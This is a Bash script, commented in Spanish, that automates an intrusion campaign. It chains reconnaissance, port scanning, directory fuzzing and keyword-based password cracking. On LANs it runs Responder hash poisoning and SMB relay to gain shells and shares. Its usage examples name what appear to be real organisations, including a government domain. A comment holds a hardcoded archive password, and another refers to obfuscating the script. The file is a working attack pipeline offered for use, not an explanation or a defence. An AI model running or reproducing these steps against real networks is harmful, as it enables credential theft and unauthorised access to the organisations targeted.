#!/bin/bash
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'
#bash-obfuscate discover-original.sh -o discover.sh

while getopts ":d:n:t:k:m:i:s:" OPTIONS
do
            case $OPTIONS in            
            d)     DOMAIN=$OPTARG;;
            n)     NOMBRE=$OPTARG;;
            k)     KEYWORD=$OPTARG;;
            t)     TYPE=$OPTARG;;
            i)     IP_LIST_FILE=$OPTARG;;
            s)     SUBNET_FILE=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TYPE=${TYPE:=NULL} #internet/lan/oscp
DOMAIN=${DOMAIN:=NULL}
SUBNET_FILE=${SUBNET_FILE:=NULL} # lista de subredes
IP_LIST_FILE=${IP_LIST_FILE:=NULL} # lista de IPs
KEYWORD=${KEYWORD:=NULL} # nombre de la entidad
echo "TYPE $TYPE"
#if [ "$KEYWORD" == NULL ] || [ "$DOMAIN" == NULL ] &&  [ "$TYPE" != 'oscp' ]; then
#if [ "$TYPE" == NULL ] || [ "$DOMAIN" == NULL ]; then
if [ "$TYPE" == NULL ]; then

cat << "EOF"

Opciones: 

-c : palabra KEYWORD para generar passwords
-d : dominio

Ejemplo 1: Escanear el listado de subredes (completo)
    discover.sh -t oscp -d htb.local -i ips.txt 
	discover.sh -t lan -d htb.local -k agetic -i ips.txt 
	discover.sh -t lan -d htb.local -k agetic  -s subnet.txt
	discover.sh -t internet -d agetic.gob.bo -k agetic 
	discover.sh -t oscp -i ips.txt 
	discover.sh -t proxy -i ips.txt 
	discover.sh -t lan -d diaconia.local -k diaconia -s redes2.txt 
	
	
EOF

exit
fi


function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}

######################
if [ $TYPE == "internet" ]; then 	
	mkdir INTERNO
	mkdir EXTERNO
	cd EXTERNO
	echo -e "[+] Lanzando monitor $RESET" 
	xterm -hold -e monitor.sh 2>/dev/null&
	recon.sh -d $DOMAIN -k $KEYWORD
	cd $DOMAIN
	#egrep --color=never -i "bolivia|Azure|amazon" importarMaltego/subdominios.csv > importarMaltego/subdominios-bolivia.csv
	egrep --color=never -i "bolivia" importarMaltego/subdominios.csv > importarMaltego/subdominios-bolivia.csv
	lanscanner.sh -m extended -i importarMaltego/subdominios-bolivia.csv -d $DOMAIN -p masscan_naabu -c n
	cracker.sh -e $KEYWORD
fi

if [ $TYPE == "oscp" ]; then 		
	lanscanner.sh -m extended -i $IP_LIST_FILE -s $SUBNET_FILE -p nmap_masscan -c n
	directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
	echo "entrando al directorio $directory" # creado por lanscanner
	cd $directory
	cracker.sh -d /usr/share/wordlists/top200.txt
	

	if [ -f servicios/web.txt ]
	then      
		echo -e "$OKBLUE #################### WEB extended (`wc -l servicios/web.txt`) ######################$RESET"	    
		for line in $(cat servicios/web.txt); do  
			host=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`		
			echo -e "[+] Wfuzz ($host:$port)" 
			wfuzz -w /usr/share/webhacks/wordlist/directory-list-2.3-medium.txt  --hc 404 -u http://$host:$port/FUZZ -f logs/enumeracion/"$host"_"$port"_extended.txt 
			egrep --color=never "C=200|C=301" logs/enumeracion/"$host"_"$port"_extended.txt > .enumeracion/"$host"_"$port"_extended.txt
		
		done # for
	insert_data	
	fi

	if [ -f servicios/web-ssl.txt ]
	then      
		echo -e "$OKBLUE #################### WEBS extended (`wc -l servicios/web-ssl.txt`) ######################$RESET"	    
		for line in $(cat servicios/web-ssl.txt); do  
			host=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`					
			echo -e "[+] Wfuzz ($host:$port)" 
			wfuzz -w /usr/share/webhacks/wordlist/directory-list-2.3-medium.txt  --hc 404 -u https://$host:$port/FUZZ -f logs/enumeracion/"$host"_"$port"_extended.txt
			egrep --color=never  "C=200|C=301" logs/enumeracion/"$host"_"$port"_extended.txt > .enumeracion/"$host"_"$port"_extended.txt
		done # for	
	insert_data
	fi
		
fi



if [ $TYPE == "proxy" ]; then 	

	lanscanner.sh -m normal -i $IP_LIST_FILE -p nmap -c s
	directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
	echo "entrando al directorio $directory" # creado por lanscanner
#	cd $directory
#	cracker.sh -d /usr/share/wordlists/top200.txt
		
fi


if [ $TYPE == "lan" ]; then 	
	# escaneo LAN
	
	echo -e "$OKBLUE Iniciando Responder $RESET"	
	iface=`ip addr | grep -iv DOWN | awk '/UP/ {print $2}' | egrep -v "lo|dummy|rmnet|vmnet" | sed 's/.$//'`
	#Borrar logs pasados
	#rm /usr/bin/pentest/Responder/logs/* 2>/dev/null
	/etc/init.d/smbd stop 
	cp /usr/bin/pentest/Responder/Responder.conf.normal /usr/bin/pentest/Responder/Responder.conf
	xterm -hold -e responder.sh -F -I $iface 2>/dev/null&
	
		
	if [ "$SUBNET_FILE" != NULL ]; then 	
	
		lanscanner.sh -m normal -s $SUBNET_FILE -d $DOMAIN -p nmap_masscan -c n
		
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		pwd
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD
		
	fi
	if [ "$IP_LIST_FILE" != NULL ]; then 	
	
		lanscanner.sh -m normal -i $IP_LIST_FILE -d $DOMAIN	-p nmap_masscan	-c n
		directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
		echo "entrando al directorio $directory" # creado por lanscanner
		cd $directory
		cracker.sh -e $KEYWORD
	fi
	
	mv /usr/bin/pentest/Responder/logs/* `pwd`/responder 2>/dev/null

	########  SMBRelay #########
	echo -e "\t[+] Testeando SMBRelay (shell)"
	killall xterm
	pwd
	smbrelay.sh -t shell &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
	sleep 10
	
	########  SHARE #########
	echo -e "\t[+] Testeando SMBRelay (shares)"	
	pwd
	smbrelay.sh -t share &
	sleep 600	
	# Matar responder, puede causar problemas de red
	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
fi

#Encritar resultados
#7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
#rm .resultados.db

